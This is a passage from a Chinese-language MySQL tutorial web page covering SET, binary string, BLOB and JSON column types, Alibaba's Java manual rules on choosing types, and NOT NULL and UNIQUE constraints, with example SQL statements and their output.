B;&#x4E0D;&#x540C;&#x3002;</p>
<pre><code class="language-sql">mysql&gt; CREATE TABLE test_set(s SET (&apos;A&apos;, &apos;B&apos;, &apos;C&apos;));
mysql&gt; INSERT INTO test_set (s) VALUES (&apos;A&apos;), (&apos;A,B&apos;);
# &#x63D2;&#x5165;&#x91CD;&#x590D;&#x7684; SET &#x7C7B;&#x578B;&#x6210;&#x5458;&#x65F6;,MySQL &#x4F1A;&#x81EA;&#x52A8;&#x5220;&#x9664;&#x91CD;&#x590D;&#x7684;&#x6210;&#x5458;
mysql&gt; INSERT INTO test_set (s) VALUES (&apos;A,B,C,A&apos;);
# &#x5411; SET &#x7C7B;&#x578B;&#x7684;&#x5B57;&#x6BB5;&#x63D2;&#x5165; SET &#x6210;&#x5458;&#x4E2D;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x503C;&#x65F6;,MySQL &#x4F1A;&#x629B;&#x51FA;&#x9519;&#x8BEF;.
mysql&gt; INSERT INTO test_set (s) VALUES (&apos;A,B,C,D&apos;);
mysql&gt; SELECT * FROM test_set;
</code></pre>
<h3 id="%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%B1%BB%E5%9E%8B">&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;</h3>
<ul>
<li>BINARY &#x4E0E; VARBINARY &#x7C7B;&#x578B;</li>
</ul>
<p>BINARY &#x548C; VARBINARY &#x7C7B;&#x4F3C;&#x4E8E; CHAR &#x548C; VARCHAR&#xFF0C;&#x7528;&#x4E8E;&#x5B58;&#x50A8;&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;&#x3002;BINARY(M) &#x4E3A;&#x56FA;&#x5B9A;&#x957F;&#x5EA6;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;M &#x8868;&#x793A;&#x6700;&#x591A;&#x80FD;&#x5B58;&#x50A8;&#x7684;&#x5B57;&#x8282;&#x6570;&#xFF0C;&#x53D6;&#x503C;&#x8303;&#x56F4;&#x662F; 0~255 &#x4E2A;&#x5B57;&#x7B26;&#x3002;&#x82E5;&#x672A;&#x6307;&#x5B9A; M&#xFF0C;&#x8868;&#x793A;&#x53EA;&#x80FD;&#x5B58;&#x50A8; 1 &#x4E2A;&#x5B57;&#x8282;&#x3002;&#x82E5;&#x5B9E;&#x9645;&#x5B57;&#x6BB5;&#x503C;&#x4E0D;&#x8DB3;&#x8BBE;&#x7F6E;&#x7684; M &#x5B57;&#x8282;&#xFF0C;&#x4F1A;&#x5728;&#x6570;&#x636E;&#x53F3;&#x4FA7;&#x586B;&#x5145; &apos;\0&apos; &#x8865;&#x9F50;&#x957F;&#x5EA6;&#x3002;VARBINARY(M) &#x4E3A;&#x53EF;&#x53D8;&#x957F;&#x5EA6;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;M &#x8868;&#x793A;&#x6700;&#x591A;&#x80FD;&#x5B58;&#x50A8;&#x7684;&#x5B57;&#x8282;&#x6570;&#xFF0C;&#x603B;&#x5B57;&#x8282;&#x6570;&#x4E0D;&#x80FD;&#x8D85;&#x8FC7;&#x884C;&#x7684;&#x5B57;&#x8282;&#x957F;&#x5EA6;&#x9650;&#x5236; 65535&#xFF0C;&#x53E6;&#x5916;&#x8FD8;&#x8981;&#x8003;&#x8651;&#x989D;&#x5916;&#x5B57;&#x8282;&#x5F00;&#x9500;&#xFF0C;VARBINARY &#x7C7B;&#x578B;&#x7684;&#x6570;&#x636E;&#x9664;&#x4E86;&#x5B58;&#x50A8;&#x6570;&#x636E;&#x672C;&#x8EAB;&#x5916;&#xFF0C;&#x8FD8;&#x9700;&#x8981; 1 &#x6216; 2 &#x4E2A;&#x5B57;&#x8282;&#x6765;&#x5B58;&#x50A8;&#x6570;&#x636E;&#x7684;&#x5B57;&#x8282;&#x6570;&#x3002;VARBINARY &#x7C7B;&#x578B;&#x5FC5;&#x987B;&#x6307;&#x5B9A; M&#xFF0C;&#x5426;&#x5219;&#x62A5;&#x9519;&#x3002;</p>
<table>
<thead>
<tr>
<th style="text-align:center">&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;</th>
<th style="text-align:center">&#x7279;&#x70B9;</th>
<th style="text-align:center">&#x503C;&#x7684;&#x957F;&#x5EA6;</th>
<th style="text-align:center">&#x5360;&#x7528;&#x7A7A;&#x95F4;(&#x5B57;&#x8282;)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">BINARY(M)</td>
<td style="text-align:center">&#x56FA;&#x5B9A;&#x957F;&#x5EA6;</td>
<td style="text-align:center">M &#xFF08;0 &lt;= M &lt;= 255&#xFF09;</td>
<td style="text-align:center">M&#x4E2A;&#x5B57;&#x8282;</td>
</tr>
<tr>
<td style="text-align:center">VARBINARY(M)</td>
<td style="text-align:center">&#x53EF;&#x53D8;&#x957F;&#x5EA6;</td>
<td style="text-align:center">M&#xFF08;0 &lt;= M &lt;= 65535&#xFF09;</td>
<td style="text-align:center">M+1&#x4E2A;&#x5B57;&#x8282;</td>
</tr>
</tbody>
</table>
<pre><code class="language-sql"># VARBINARY &#x5FC5;&#x987B;&#x6307;&#x5B9A;&#x957F;&#x5EA6;
mysql&gt; CREATE TABLE test_binary1(f1 BINARY,f2 BINARY(3),f3 VARBINARY(10));
mysql&gt; INSERT INTO test_binary1(f1,f2) VALUES(&apos;a&apos;,&apos;a&apos;);
# &#x5931;&#x8D25; =&gt; ERROR 1406 (22001): Data too long for column &apos;f1&apos; at row 1
mysql&gt; INSERT INTO test_binary1(f1,f2) VALUES(&apos;&#x5F00;&apos;,&apos;&#x53D1;&apos;);
mysql&gt; INSERT INTO test_binary1(f2,f3) VALUES(&apos;zs&apos;,&apos;zs&apos;);
# &#x4E00;&#x4E2A;&#x56FA;&#x5B9A;&#x957F;&#x5EA6;&#x3001;&#x4E00;&#x4E2A;&#x6CA1;&#x6709;&#x56FA;&#x5B9A;&#x957F;&#x5EA6;
mysql&gt; SELECT LENGTH(f2),LENGTH(f3) FROM test_binary1;
</code></pre>
<ul>
<li>BLOB &#x7C7B;&#x578B;</li>
</ul>
<p>BLOB &#x53EF;&#x4EE5;&#x5B58;&#x50A8;&#x4E00;&#x4E2A;&#x4E8C;&#x8FDB;&#x5236;&#x7684;&#x5927;&#x5BF9;&#x8C61;&#xFF0C;&#x5E38;&#x89C1;&#x56FE;&#x7247;&#x3001;&#x97F3;&#x9891;&#x548C;&#x89C6;&#x9891;&#x7B49;&#x3002;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x5728;&#x5B9E;&#x9645;&#x5DE5;&#x4F5C;&#x4E2D;&#x5F80;&#x5F80;&#x4E0D;&#x4F1A;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4F7F;&#x7528; BLOB &#x7C7B;&#x578B;&#x5B58;&#x50A8;&#x5927;&#x5BF9;&#x8C61;&#x6570;&#x636E;&#xFF0C;&#x901A;&#x5E38;&#x4F1A;&#x5C06;&#x56FE;&#x7247;&#x3001;&#x97F3;&#x9891;&#x548C;&#x89C6;&#x9891;&#x6587;&#x4EF6;&#x5B58;&#x50A8;&#x5230;&#x670D;&#x52A1;&#x5668;&#x7684;&#x78C1;&#x76D8;&#x4E0A;&#xFF0C;&#x5E76;&#x5C06;&#x56FE;&#x7247;&#x3001;&#x97F3;&#x9891;&#x548C;&#x89C6;&#x9891;&#x7684;&#x8BBF;&#x95EE;&#x8DEF;&#x5F84;&#x5B58;&#x50A8;&#x5230;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x3002;</p>
<table>
<thead>
<tr>
<th style="text-align:center">&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;</th>
<th style="text-align:center">&#x503C;&#x7684;&#x957F;&#x5EA6;</th>
<th style="text-align:center">&#x957F;&#x5EA6;&#x8303;&#x56F4;</th>
<th style="text-align:center">&#x5360;&#x7528;&#x7A7A;&#x95F4;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">TINYBLOB</td>
<td style="text-align:center">L</td>
<td style="text-align:center">0 &lt;= L &lt;= 255</td>
<td style="text-align:center">L + 1 &#x4E2A;&#x5B57;&#x8282;</td>
</tr>
<tr>
<td style="text-align:center">BLOB</td>
<td style="text-align:center">L</td>
<td style="text-align:center">0 &lt;= L &lt;= 65535&#xFF08;&#x76F8;&#x5F53;&#x4E8E;64KB&#xFF09;</td>
<td style="text-align:center">L + 2 &#x4E2A;&#x5B57;&#x8282;</td>
</tr>
<tr>
<td style="text-align:center">MEDIUMBLOB</td>
<td style="text-align:center">L</td>
<td style="text-align:center">0 &lt;= L &lt;= 16777215 &#xFF08;&#x76F8;&#x5F53;&#x4E8E;16MB&#xFF09;</td>
<td style="text-align:center">L + 3 &#x4E2A;&#x5B57;&#x8282;</td>
</tr>
<tr>
<td style="text-align:center">LONGBLOB</td>
<td style="text-align:center">L</td>
<td style="text-align:center">0 &lt;= L &lt;= 4294967295&#xFF08;&#x76F8;&#x5F53;&#x4E8E;4GB&#xFF09;</td>
<td style="text-align:center">L + 4 &#x4E2A;&#x5B57;&#x8282;</td>
</tr>
</tbody>
</table>
<pre><code class="language-sql">mysql&gt; CREATE TABLE test_blob1(id INT,img MEDIUMBLOB);
# &#x6D41;&#x7684;&#x65B9;&#x5F0F;&#x5F15;&#x5165;...
</code></pre>
<ul>
<li>TEXT &#x548C; BLOB &#x7684;&#x4F7F;&#x7528;&#x6CE8;&#x610F;&#x4E8B;&#x9879;</li>
</ul>
<p>&#x5728;&#x6267;&#x884C;&#x4E86;&#x5927;&#x91CF;&#x5220;&#x9664;&#x6216;&#x66F4;&#x65B0;&#x64CD;&#x4F5C;&#x540E;&#x3002;&#x8FD9;&#x7C7B;&#x503C;&#x4F1A;&#x5728;&#x6570;&#x636E;&#x8868;&#x4E2D;&#x7559;&#x4E0B;&#x5F88;&#x5927;&#x7684;&quot;&#x7A7A;&#x6D1E;&quot;&#xFF0C;&#x4EE5;&#x540E;&#x586B;&#x5165;&#x8FD9;&#x4E9B;&quot;&#x7A7A;&#x6D1E;&quot;&#x7684;&#x8BB0;&#x5F55;&#x53EF;&#x80FD;&#x957F;&#x5EA6;&#x4E0D;&#x540C;&#x3002;&#x5EFA;&#x8BAE;&#x5B9A;&#x671F;&#x4F7F;&#x7528; OPTIMIZE TABLE &#x5BF9;&#x8FD9;&#x7C7B;&#x8868;&#x8FDB;&#x884C;&#x788E;&#x7247;&#x6574;&#x7406;&#x3002;</p>
<p>&#x82E5;&#x9700;&#x5BF9;&#x5927;&#x6587;&#x672C;&#x5B57;&#x6BB5;&#x8FDB;&#x884C;&#x6A21;&#x7CCA;&#x67E5;&#x8BE2;&#xFF0C;&#x867D;&#x7136;&#x6570;&#x636E;&#x5E93;&#x63D0;&#x4F9B;&#x4E86;&#x524D;&#x7F00;&#x7D22;&#x5F15;&#xFF0C;&#x4F46;&#x662F;&#x4ECD;&#x7136;&#x8981;&#x907F;&#x514D;&#x68C0;&#x7D22;&#x5927;&#x578B;&#x7684; BLOB &#x6216; TEXT&#x3002;&#x9664;&#x975E;&#x80FD;&#x4F7F;&#x7528;&#x786E;&#x5B9A;&#x7EA6;&#x675F;&#x6761;&#x4EF6;&#x7684; WHERE &#x5B50;&#x53E5;&#xFF0C;&#x5426;&#x5219; SELECT * &#x67E5;&#x8BE2;&#x53EF;&#x80FD;&#x4F1A;&#x5728;&#x7F51;&#x7EDC;&#x4E0A;&#x4F20;&#x8F93;&#x5927;&#x91CF;&#x7684; BLOB &#x6216; TEXT &#x503C;&#x3002;</p>
<p>&#x82E5;&#x628A;&#x8FD9;&#x4E9B;&#x6570;&#x636E;&#x5217;&#x79FB;&#x52A8;&#x5206;&#x79BB;&#x5230;&#x5355;&#x72EC;&#x7684;&#x8868;&#x4E2D;&#xFF0C;&#x90A3;&#x4E48;&#x53EF;&#x4EE5;&#x51CF;&#x5C11;&#x4E3B;&#x8868;&#x4E2D;&#x7684;&#x788E;&#x7247;&#xFF0C;&#x5F97;&#x5230;&#x56FA;&#x5B9A;&#x957F;&#x5EA6;&#x6570;&#x636E;&#x884C;&#x7684;&#x6027;&#x80FD;&#x4F18;&#x52BF;&#xFF0C;&#x518D;&#x8FDB;&#x884C;&#x67E5;&#x8BE2;&#xFF0C;&#x5C31;&#x4E0D;&#x4F1A;&#x51FA;&#x73B0;&#x5927;&#x91CF;&#x7684;&#x503C;&#x4F20;&#x8F93;&#x3002;</p>
<h3 id="json-%E7%B1%BB%E5%9E%8B">JSON &#x7C7B;&#x578B;</h3>
<p>JSON JavaScript Object Notation &#x662F;&#x4E00;&#x79CD;&#x8F7B;&#x91CF;&#x7EA7;&#x7684;&#x6570;&#x636E;&#x4EA4;&#x6362;&#x683C;&#x5F0F;&#xFF0C;&#x4E5F;&#x662F;&#x7406;&#x60F3;&#x7684;&#x6570;&#x636E;&#x4EA4;&#x6362;&#x8BED;&#x8A00;&#x3002;&#x5176;&#x53EF;&#x5C06; JavaScript &#x5BF9;&#x8C61;&#x4E2D;&#x8868;&#x793A;&#x7684;&#x4E00;&#x7EC4;&#x6570;&#x636E;&#x8F6C;&#x6362;&#x4E3A;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x7F51;&#x7EDC;&#x6216;&#x8005;&#x7A0B;&#x5E8F;&#x4E4B;&#x95F4;&#x4F20;&#x9012;&#xFF0C;&#x5E76;&#x5728;&#x9700;&#x8981;&#x7684;&#x65F6;&#x5019;&#x5C06;&#x5176;&#x8FD8;&#x539F;&#x4E3A;&#x5404;&#x7F16;&#x7A0B;&#x8BED;&#x8A00;&#x6240;&#x652F;&#x6301;&#x7684;&#x6570;&#x636E;&#x683C;&#x5F0F;&#x3002;&#x8F83; XML &#x66F4;&#x4E3A;&#x8F7B;&#x91CF;&#x3002;</p>
<p>&#x5728; MySQL5.7 &#x5C31;&#x5DF2;&#x7ECF;&#x652F;&#x6301; JSON &#x6570;&#x636E;&#x7C7B;&#x578B;&#x3002;MySQL8.x &#x7248;&#x672C;&#x4E2D;&#xFF0C;JSON &#x7C7B;&#x578B;&#x63D0;&#x4F9B;&#x4E86;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x81EA;&#x52A8;&#x9A8C;&#x8BC1;&#x7684; JSON &#x6587;&#x6863;&#x548C;&#x4F18;&#x5316;&#x7684;&#x5B58;&#x50A8;&#x7ED3;&#x6784;&#x3002;</p>
<pre><code class="language-sql"># &#x521B;&#x5EFA;&#x6570;&#x636E;&#x8868;,&#x8868;&#x4E2D;&#x5305;&#x542B;&#x4E00;&#x4E2A; JSON &#x7C7B;&#x578B;&#x7684;&#x5B57;&#x6BB5; js 
mysql&gt; CREATE TABLE test_json(js json);
mysql&gt; INSERT INTO test_json (js) VALUES (&apos;{&quot;name&quot;:&quot;zs&quot;, &quot;age&quot;:20, &quot;address&quot;:{&quot;province&quot;:&quot;hn&quot;,&quot;city&quot;:&quot;cs&quot;}}&apos;);
mysql&gt; SELECT * FROM test_json;
# &#x5F53;&#x9700;&#x8981;&#x68C0;&#x7D22;JSON&#x7C7B;&#x578B;&#x7684;&#x5B57;&#x6BB5;&#x4E2D;&#x6570;&#x636E;&#x7684;&#x67D0;&#x4E2A;&#x5177;&#x4F53;&#x503C;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x201C;-&gt;&#x201D;&#x548C;&#x201C;-&gt;&gt;&#x201D;&#x7B26;&#x53F7;
mysql&gt; SELECT js -&gt; &apos;$.name&apos; AS NAME,js -&gt; &apos;$.age&apos; AS age ,js -&gt; &apos;$.address.province&apos; AS province, js -&gt; &apos;$.address.city&apos; AS city FROM test_json;
</code></pre>
<h3 id="%E5%B0%8F%E7%BB%93">&#x5C0F;&#x7ED3;</h3>
<p>&#x4E3A;&#x786E;&#x4FDD;&#x7CFB;&#x7EDF;&#x4E0D;&#x4F1A;&#x56E0;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x5B9A;&#x4E49;&#x51FA;&#x9519;&#xFF0C;&#x5B9A;&#x4E49;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x65F6;&#xFF0C;&#x6574;&#x6570;&#x7528; INT&#xFF1B;&#x5C0F;&#x6570;&#x7528;&#x5B9A;&#x70B9;&#x6570;&#x7C7B;&#x578B; DECIMAL(M,D)&#xFF1B;&#x65E5;&#x671F;&#x4E0E;&#x65F6;&#x95F4;&#x7528; DATETIME&#x3002;&#x503C;&#x5F97;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x53EF;&#x9760;&#x6027;&#x597D;&#x5E76;&#x4E0D;&#x610F;&#x5473;&#x7740;&#x9AD8;&#x6548;&#x3002;&#x5373; TEXT &#x867D;&#x7136;&#x4F7F;&#x7528;&#x65B9;&#x4FBF;&#xFF0C;&#x4F46;&#x662F;&#x6548;&#x7387;&#x4E0D;&#x5982; CHAR(M) &#x548C; VARCHAR(M)&#x3002;</p>
<p>&#x5173;&#x4E8E;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x9009;&#x62E9;&#xFF0C;&#x5EFA;&#x8BAE;&#x53C2;&#x8003;&#x5982;&#x4E0B;&#x963F;&#x91CC;&#x5DF4;&#x5DF4;&#x7684;&#x300A;Java&#x5F00;&#x53D1;&#x624B;&#x518C;&#x300B;&#x89C4;&#x8303;&#x3002;</p>
<blockquote>
<p>&#x963F;&#x91CC;&#x5DF4;&#x5DF4;&#x300A;Java&#x5F00;&#x53D1;&#x624B;&#x518C;&#x300B;&#x4E4B; MySQL &#x6570;&#x636E;&#x5E93;</p>
<ul>
<li>&#x4EFB;&#x4F55;&#x5B57;&#x6BB5;&#x5982;&#x679C;&#x4E3A;&#x975E;&#x8D1F;&#x6570;&#xFF0C;&#x5FC5;&#x987B;&#x662F; UNSIGNED
<ul>
<li>&#x3010;&#x5F3A;&#x5236;&#x3011;&#x5C0F;&#x6570;&#x7C7B;&#x578B;&#x4E3A; DECIMAL&#xFF0C;&#x7981;&#x6B62;&#x4F7F;&#x7528; FLOAT &#x548C; DOUBLE&#x3002;
<ul>
<li>&#x8BF4;&#x660E;&#xFF1A;&#x5728;&#x5B58;&#x50A8;&#x7684;&#x65F6;&#x5019;&#xFF0C;FLOAT &#x548C; DOUBLE &#x90FD;&#x5B58;&#x5728;&#x7CBE;&#x5EA6;&#x635F;&#x5931;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x5F88;&#x53EF;&#x80FD;&#x5728;&#x6BD4;&#x8F83;&#x503C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5F97;&#x5230;&#x4E0D;&#x6B63;&#x786E;&#x7684;&#x7ED3;&#x679C;&#x3002;&#x5982;&#x679C;&#x5B58;&#x50A8;&#x7684;&#x6570;&#x636E;&#x8303;&#x56F4;&#x8D85;&#x8FC7; DECIMAL &#x7684;&#x8303;&#x56F4;&#xFF0C;&#x5EFA;&#x8BAE;&#x5C06;&#x6570;&#x636E;&#x62C6;&#x6210;&#x6574;&#x6570;&#x548C;&#x5C0F;&#x6570;&#x5E76;&#x5206;&#x5F00;&#x5B58;&#x50A8;&#x3002;</li>
</ul>
</li>
<li>&#x3010;&#x5F3A;&#x5236;&#x3011;&#x5982;&#x679C;&#x5B58;&#x50A8;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x957F;&#x5EA6;&#x51E0;&#x4E4E;&#x76F8;&#x7B49;&#xFF0C;&#x4F7F;&#x7528; CHAR &#x5B9A;&#x957F;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#x3002;</li>
<li>&#x3010;&#x5F3A;&#x5236;&#x3011;VARCHAR &#x662F;&#x53EF;&#x53D8;&#x957F;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x4E0D;&#x9884;&#x5148;&#x5206;&#x914D;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#xFF0C;&#x957F;&#x5EA6;&#x4E0D;&#x8981;&#x8D85;&#x8FC7; 5000&#x3002;&#x5982;&#x679C;&#x5B58;&#x50A8;&#x957F;&#x5EA6;&#x5927;&#x4E8E;&#x6B64;&#x503C;&#xFF0C;&#x5B9A;&#x4E49;&#x5B57;&#x6BB5;&#x7C7B;&#x578B;&#x4E3A; TEXT&#xFF0C;&#x72EC;&#x7ACB;&#x51FA;&#x6765;&#x4E00;&#x5F20;&#x8868;&#xFF0C;&#x7528;&#x4E3B;&#x952E;&#x6765;&#x5BF9;&#x5E94;&#xFF0C;&#x907F;&#x514D;&#x5F71;&#x54CD;&#x5176;&#x5B83;&#x5B57;&#x6BB5;&#x7D22;&#x5F15;&#x6548;&#x7387;&#x3002;</li>
</ul>
</li>
</ul>
</blockquote>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E7%BA%A6%E6%9D%9F">&#x7EA6;&#x675F;</h2>
<p>&#x7EA6;&#x675F;&#x5373;&#x5BF9;&#x8868;&#x4E2D;&#x5B57;&#x6BB5;&#x7684;&#x9650;&#x5236;&#xFF0C;&#x76EE;&#x7684;&#x662F;&#x4FDD;&#x8BC1;&#x6570;&#x636E;&#x7684;&#x5B8C;&#x6574;&#x6027;&#x3002;&#x5B8C;&#x6574;&#x6027;&#x53C8;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;&#x5B9E;&#x4F53;&#x5B8C;&#x6574;&#x6027;&#x3001;&#x57DF;&#x5B8C;&#x6574;&#x6027;&#x3001;&#x5F15;&#x7528;&#x5B8C;&#x6574;&#x6027;&#x4EE5;&#x53CA;&#x81EA;&#x5B9A;&#x4E49;&#x5B8C;&#x6574;&#x6027;&#x3002;</p>
<pre><code class="language-sql"># &#x67E5;&#x770B;&#x67D0;&#x4E2A;&#x8868;&#x5DF2;&#x6709;&#x7684;&#x7EA6;&#x675F;
# information_schema =&gt; &#x7CFB;&#x7EDF;&#x5E93;
# table_constraints =&gt; &#x4E13;&#x95E8;&#x5B58;&#x50A8;&#x5404;&#x4E2A;&#x8868;&#x7684;&#x7EA6;&#x675F;&#x7684;&#x8868;
SELECT * FROM information_schema.table_constraints WHERE table_name = &apos;&#x8868;&#x540D;&#x79F0;&apos;;
</code></pre>
<h3 id="%E9%9D%9E%E7%A9%BA%E7%BA%A6%E6%9D%9F">&#x975E;&#x7A7A;&#x7EA6;&#x675F;</h3>
<p>&#x9ED8;&#x8BA4;&#x6240;&#x6709;&#x7C7B;&#x578B;&#x7684;&#x503C;&#x90FD;&#x53EF;&#x4EE5;&#x662F; NULL&#xFF0C;&#x975E;&#x7A7A;&#x7EA6;&#x675F;&#x53EA;&#x80FD;&#x51FA;&#x73B0;&#x5728;&#x8868;&#x5BF9;&#x8C61;&#x7684;&#x5217;&#x4E0A;&#xFF0C;&#x53EA;&#x80FD;&#x67D0;&#x4E2A;&#x5217;&#x5355;&#x72EC;&#x9650;&#x5B9A;&#x975E;&#x7A7A;&#xFF0C;&#x4E0D;&#x80FD;&#x7EC4;&#x5408;&#x9650;&#x5B9A;&#x975E;&#x7A7A;&#x3002;&#x7A7A;&#x5B57;&#x7B26;&#x4E32; &apos; &apos; &#x4E0D;&#x7B49;&#x4E8E; NULL&#xFF0C;0 &#x4E5F;&#x4E0D;&#x7B49;&#x4E8E; NULL&#x3002;</p>
<pre><code class="language-sql">/* &#x5EFA;&#x8868;&#x65F6;&#x6DFB;&#x52A0;&#x975E;&#x7A7A;&#x7EA6;&#x675F; */
# CREATE TABLE &#x8868;&#x540D;&#x79F0;(...,&#x5B57;&#x6BB5;&#x540D; &#x6570;&#x636E;&#x7C7B;&#x578B; NOT NULL,...);
mysql&gt; CREATE DATABASE dbtest13;
mysql&gt; USE dbtest13;
mysql&gt; CREATE TABLE test1(id INT NOT NULL,last_name VARCHAR(15) NOT NULL,email VARCHAR(25),salary DECIMAL(10,2));
mysql&gt; DESC test1;
+-----------+---------------+------+-----+---------+-------+
| Field     | Type          | Null | Key | Default | Extra |
+-----------+---------------+------+-----+---------+-------+
| id        | int           | NO   |     | NULL    |       |
| last_name | varchar(15)   | NO   |     | NULL    |       |
| email     | varchar(25)   | YES  |     | NULL    |       |
| salary    | decimal(10,2) | YES  |     | NULL    |       |
+-----------+---------------+------+-----+---------+-------+
mysql&gt; INSERT INTO test1(id,last_name,email,salary) VALUES (1,&apos;zs&apos;,&apos;zs@mail.com&apos;,99999);
# ERROR 1048 (23000): Column &apos;last_name&apos; cannot be null
mysql&gt; INSERT INTO test1(id,last_name,email,salary) VALUES (2,NULL,&apos;someone@mail.com&apos;,0000);
# ERROR 1048 (23000): Column &apos;id&apos; cannot be null
mysql&gt; INSERT INTO test1(id,last_name,email,salary) VALUES (NULL,&apos;gz&apos;,&apos;gz@mail.com&apos;,99998);
# &#x672A;&#x7ED9;&#x5B57;&#x6BB5;&#x8D4B;&#x503C;&#x5148;&#x627E;&#x9ED8;&#x8BA4;&#x503C;,&#x65E0;&#x9ED8;&#x8BA4;&#x503C;&#x518D;&#x8003;&#x8651;NULL.
# ERROR 1364 (HY000): Field &apos;last_name&apos; doesn&apos;t have a default value
mysql&gt; INSERT INTO test1(id,email) VALUES (4,&apos;hz@mail.com&apos;);
# &#x66F4;&#x65B0;&#x65F6;&#x9650;&#x5236;
mysql&gt; UPDATE test1 SET last_name = NULL WHERE id = 1;
/* &#x5EFA;&#x8868;&#x540E;&#x6DFB;&#x52A0;&#x975E;&#x7A7A;&#x7EA6;&#x675F; */
mysql&gt; ALTER TABLE test1 MODIFY email VARCHAR(25) NOT NULL;
mysql&gt; DESC test1;
/*
&#x5220;&#x9664;&#x975E;&#x7A7A;&#x7EA6;&#x675F;
ALTER TABLE &#x8868;&#x540D; MODIFY &#x5B57;&#x6BB5;&#x540D; &#x6570;&#x636E;&#x7C7B;&#x578B; NULL;
ALTER TABLE &#x8868;&#x540D; MODIFY &#x5B57;&#x6BB5;&#x540D; &#x6570;&#x636E;&#x7C7B;&#x578B;;
*/
mysql&gt; ALTER table test1 modify email VARCHAR(25) NULL;
</code></pre>
<h3 id="%E5%94%AF%E4%B8%80%E6%80%A7%E7%BA%A6%E6%9D%9F">&#x552F;&#x4E00;&#x6027;&#x7EA6;&#x675F;</h3>
<p>&#x552F;&#x4E00;&#x6027;&#x7EA6;&#x675F;&#x7528;&#x6765;&#x9650;&#x5236;&#x67D0;&#x4E2A;&#x5B57;&#x6BB5;&#x7684;&#x503C;&#x4E0D;&#x80FD;&#x91CD;&#x590D;&#x3002;&#x552F;&#x4E00;&#x6027;&#x7EA6;&#x675F;&#x5141;&#x8BB8;&#x5217;&#x503C;&#x4E3A;&#x7A7A;&#x3002;&#x540C;&#x4E00;&#x4E2A;&#x8868;&#x53EF;&#x4EE5;&#x6709;&#x591A;&#x4E2A;&#x552F;&#x4E00;&#x7EA6;&#x675F;&#x3002;&#x552F;&#x4E00;&#x7EA6;&#x675F;&#x53EF;&#x4EE5;&#x662F;&#x67D0;&#x4E2A;&#x5217;&#x7684;&#x503C;&#x552F;&#x4E00;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x591A;&#x4E2A;&#x5217;&#x7EC4;&#x5408;&#x503C;&#x552F;&#x4E00;&#x3002;&#x5728;&#x521B;&#x5EFA;&#x552F;&#x4E00;&#x7EA6;&#x675F;&#x65F6;&#xFF0C;&#x82E5;&#x4E0D;&#x7ED9;&#x552F;&#x4E00;&#x7EA6;&#x675F;&#x547D;&#x540D;&#xFF0C;&#x5C31;&#x9ED8;&#x8BA4;&#x548C;&#x5217;&#x540D;&#x76F8;&#x540C;&#x3002;&#x6570;&#x636E;&#x5E93;&#x4F1A;&#x5728;&#x552F;&#x4E00;&#x7EA6;&#x675F;&#x7684;&#x5217;&#x4E0A;&#x9ED8;&#x8BA4;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x552F;&#x4E00;&#x7D22;&#x5F15;&#x3002;</p>
<pre><code class="language-sql">/* &#x5EFA;&#x8868;&#x65F6;&#x6DFB;&#x52A0;&#x552F;&#x4E00;&#x6027;&#x7EA6;&#x675F; */
# &#x5217;&#x7EA7;&#x7EA6;&#x675F; + &#x8868;&#x7EA7;&#x7EA6;&#x675F;
mysql&gt; CREATE TABLE test2(id INT UNIQUE,last_name VARCHAR(15),email VARCHAR(25),salary DECIMAL(10,2),CONSTRAINT uni_test2_email UNIQUE(email));
mysql&gt; DESC test2;
+-----------+---------------+------+-----+---------+-------+
| Field     | Type          | Null | Key | Default | Extra |
+-----------+---------------+------+-----+---------+-------+
| id        | int           | YES  | UNI | NULL    |       |
| last_name | varchar(15)   | YES  |     | NULL    |       |
| email     | varchar(25)   | YES  | UNI | NULL    |       |
| salary    | decimal(10,2) | YES  |     | NULL    |       |
+-----------+---------------+------+-----+---------+-------+
mysql&gt; SELECT * FROM information_schema.table_constraints WHERE table_name = &apos;test2&apos;;
+--------------------+-------------------+-----------------+--------------+------------+-----------------+----------+
| CONSTRAINT_CATALOG | CONSTRAINT_SCHEMA | CONSTRAINT_NAME | TABLE_SCHEMA | TABLE_NAME | CONSTRAINT_TYPE | ENFORCED |
+--------------------+-------------------+-----------------+--------------+------------+-----------------+----------+
| def                | dbtest13          | id              | dbtest13     | test2      | UNIQUE          | YES      |
| def                | dbtest13          | uni_test2_email | dbtest13     | test2      | UNIQUE          | YES      |
+--------------------+-------------------+-----------------+--------------+------------+-----------------+----------+
